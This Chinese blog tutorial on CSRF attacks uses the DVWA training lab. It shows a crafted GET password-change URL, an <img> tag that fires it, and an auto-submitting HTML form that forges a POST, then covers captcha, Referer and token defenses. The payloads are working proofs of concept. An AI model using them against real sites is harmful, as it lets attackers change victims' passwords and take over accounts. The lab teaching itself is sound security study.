---
title: CSRF学习
date: 2016-04-19 18:45:30
categories: 安全 
tags: Web安全
---
## 一、简介
CSRF(跨站点请求伪造)，即攻击者构造一个URL，通常这个URL是可以完成某种动作，如添加管理员，删除文章等等。然后发送给已登录的用户，当该用户点击此URL时就会触发攻击。
以DVWA为例：
当管理员更改密码时，以GET方式提交链接如下
`http://xxx.com/DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#`  
分析这个链接可以得知。password_new和password_conf为新密码和确认密码，如果此时构造一个URL，如`http://xxx.com/DVWA/vulnerabilities/csrf/?password_new=mypassowrd&password_conf=mypassowrd&Change=Change#`
发送给已经登录dvwa的管理员，当管理员点击此链接时，就会更改密码为mypassword，在这里不用再通过Web界面进行操作。
<!--more-->
所以CSRF利用时必须要确保被攻击者已经登录，并且要访问攻击URL。
## 二、利用方式
1. GET方式的CSRF  
前面的例子便是GET类型的CSRF，所有的参数都在URL中，利用方式也十分简单，只需发送URL即可，如果细心一点就会发现，所以可以在自己的网站新建一个页面，URL为`www.xxx.com/csrf.html`内容为`<img src=http://xxx.com/DVWA/vulnerabilities/csrf/?password_new=mypassowrd&password_conf=mypassowrd&Change=Change /> ` 当其他人访问`www.xxx.com/csrf.html`就会发起一次请求。
从而造成攻击

2. POST方式的CSRF
使用POST方式时，虽然在URL不再显示参数，但是仍然可以利用CSRF。
例如，更改密码操作时，post数据如下：
```
POST /DVWA/vulnerabilities/csrf/ HTTP/1.1
Host: 127.0.0.1
Content-Length: 58
Pragma: no-cache
Cache-Control: no-cache
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36
Content-Type: application/x-www-form-urlencoded
DNT: 1
Referer: http://127.0.0.1/DVWA/vulnerabilities/csrf/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: security=low; PHPSESSID=92rjonocjdna01q1t002vams90
password_new=password&password_conf=password&Change=Change
```
此时，可以创建一个autosubmit.html，自动提交数据，如下
```
<html>
  <body>
      <form id="autosubmit" action="http://127.0.0.1/DVWA/vulnerabilities/csrf/#" method="post">
          <input type="password" name="password_new" value="password2">
          <input type="password" name="password_conf" value="password2">
          <input type="action" value="Change" name="Change"> -->
      </form>
      <script type="text/javascript">
        var autosubmit=document.getElementById("autosubmit")
        autosubmit.submit();
      </script>
  </body>
</html>
```
当打开此页面时，就会自动向`http://127.0.0.1/DVWA/vulnerabilities/csrf/#`提交表单。
所以POST方式仍然可以造成CSRF。

## 三、防御
### 1.验证码
当使用验证码时，由于不知道验证码的内容，就无法利用，有效的防御了CSRF。

### 2.验证refer
HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器藉此可以获得一些信息用于处理。
比如当更改密码操作时，refer为`http://127.0.0.1/DVWA/vulnerabilities/csrf/`。如果是csrf攻击，则页面就来自与被攻击者打开的页面，例如`http://xxx.com/csrf.html`。通过检查refer值，就可以判断是否为csrf。但是服务器并不是任何时候可以接受到refer值。

### 3.Token
使用token可以有效防御。完成一次csrf攻击必须要有正确的url,如果有一项参数不正确，就无法利用。token是一种身份标记。当用户登录网站时，服务器机会随机产生token值给用户，并保存在session中，当用户有重要操作时，就会一起发送token值。服务器收到后会与session中的token值进行对比，如果一致则通过，否则就认为是非法请求。
例如当用户更改密码时，post数据中就会一起发送user_token值。
```
password_new=password&password_conf=password&Change=Change&user_token=343e19282cbc3e91a774f452de3d36de
```
### 4.其它
### 1.xss+csrf
当网站使用token防御时，如果存在xss漏洞，那么可以就可以进行csrf攻击。利用xss获取token。
### 2.csrf检测工具
[CSRF-Request-Builder](https://github.com/TheRook/CSRF-Request-Builder)  
[CSRFTester](https://www.owasp.org/index.php/CSRFTester)

** 参考**

 - 《白帽子讲Web安全》
 - 《Web安全深度剖析》
 -  [wooyun知识库](http://wiki.wooyun.org/)
